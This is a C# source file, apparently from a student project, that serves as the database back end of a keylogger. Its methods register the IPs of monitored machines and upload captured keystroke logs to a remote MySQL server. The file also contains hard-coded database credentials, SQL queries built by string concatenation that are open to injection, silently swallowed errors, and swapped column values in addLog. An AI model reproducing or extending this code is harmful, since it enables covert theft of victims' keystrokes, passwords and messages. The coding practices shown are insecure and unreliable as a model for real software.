using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SqlClient;
using MySql.Data.MySqlClient;


namespace Ggrunntenging
{

    class ggrunnur
    {
        /*
        SqlConnection dbTenging = new SqlConnection("Server=82.148.66.15;Database=0211962669_loka;Uid=0211962669;Pwd=mypassword");

        
        public void addLogger(string ip)//Bætir við logger í active og venjulega safnið
        {
            SqlCommand dbquery = new SqlCommand("CALL addLogger(" + ip + ")", dbTenging);
            try
            {
                dbTenging.Open();
                dbquery.ExecuteNonQuery();
                dbTenging.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }*/
        
        string MyConnection2 = "datasource=tsuts.tskoli.is;port=3306;username=0211962669;password=mypassword";

        public void addLogger(string ip)//Bætir við logger í active og venjulega safnið
        {
            try
            {


                //string Query = "insert into 0211962669_loka.activeloggers(ip) values('" + ip + "');";
                string Query = "INSERT INTO 0211962669_loka.keyloggers(ip) VALUES ('" + ip + "'); REPLACE INTO 0211962669_loka.activeloggers(ip) VALUES ('" + ip + "');";
                //string Query = "CALL addLogger('" + ip +  "');";

                //string Query = "insert into 0211962669_loka.activeloggers(ip, status) values('"ip"','"status"');";

                //This is  MySqlConnection here i have created the object and pass my connection string. 

                MySqlConnection MyConn2 = new MySqlConnection(MyConnection2);

                //This is command class which will handle the query and connection object. 

                MySqlCommand MyCommand2 = new MySqlCommand(Query, MyConn2);

                MySqlDataReader MyReader2;

                MyConn2.Open();

                MyReader2 = MyCommand2.ExecuteReader();     // Here our query will be executed and data saved into the database. 

                while (MyReader2.Read())

                {



                }

                MyConn2.Close();

            }
            catch (Exception e)
            {
            }
        }
        
        public void addLog(string ip, string keylogg)//Upploadar keyloggið
        {
            try
            {



                string Query = "INSERT INTO 0211962669_loka.keyloggs(log, logger_ip) VALUES ('" + ip + "','" + keylogg + "');";

                //string Query = "insert into 0211962669_loka.activeloggers(ip, status) values('"ip"','"status"');";

                //This is  MySqlConnection here i have created the object and pass my connection string. 

                MySqlConnection MyConn2 = new MySqlConnection(MyConnection2);

                //This is command class which will handle the query and connection object. 

                MySqlCommand MyCommand2 = new MySqlCommand(Query, MyConn2);

                MySqlDataReader MyReader2;

                MyConn2.Open();

                MyReader2 = MyCommand2.ExecuteReader();     // Here our query will be executed and data saved into the database. 

                while (MyReader2.Read())

                {



                }

                MyConn2.Close();

            }
            catch (Exception e)
            {
            }
        }
        /*
        public void addLog(string ip, string logg)//Bætir við log með ip tölu í gagnagrunninn
        {
            SqlCommand dbquery = new SqlCommand("CALL addLog(" + logg + "," + ip + ")", dbTenging);
            try
            {
                dbTenging.Open();
                dbquery.ExecuteNonQuery();
                dbTenging.Close();
            }
            catch (Exception e)
            {
                ForKeyLoggerProject.Main.errors("can't connect");

            }
        }
        public void statusUpdate(string ip, string status)//Uppfæra status
        {
            SqlCommand dbquery = new SqlCommand("CALL statusUpdate(" + "192.168.1.9" + "," + "heelo" + ")", dbTenging);
            try
            {
                dbTenging.Open();
                dbquery.ExecuteNonQuery();
                dbTenging.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }
        public void clearActive()//Hreinsar allt úr Activelogger safninu
        {
            SqlCommand dbquery = new SqlCommand("CALL clearActive()", dbTenging);
            try
            {
                dbTenging.Open();
                dbquery.ExecuteNonQuery();
                dbTenging.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }


        //
        /// <summary>
        /////////////////////// Engin þörf
        /// </summary>
        //

        public SqlDataReader getActive()//Nær í currently active loggers
        {
            SqlDataReader reader = null;
            SqlCommand dbquery = new SqlCommand("CALL getActive()", dbTenging);
            try
            {
                dbTenging.Open();
                reader = dbquery.ExecuteReader();
                dbTenging.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
            return reader;
        }
        public SqlDataReader getLoggers()//Nær í ALLA loggera
        {
            SqlDataReader reader = null;
            SqlCommand dbquery = new SqlCommand("CALL getLoggers()", dbTenging);
            try
            {
                dbTenging.Open();
                reader = dbquery.ExecuteReader();
                dbTenging.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
            return reader;
        }
        public SqlDataReader getLogs(string ip)//Nær í logs frá ákveðinni IP tölu
        {
            SqlDataReader reader = null;
            SqlCommand dbquery = new SqlCommand("CALL getLogs("+ip+")", dbTenging);
            try
            {
                dbTenging.Open();
                reader = dbquery.ExecuteReader();
                dbTenging.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
            return reader;
        }
        */
    }
}
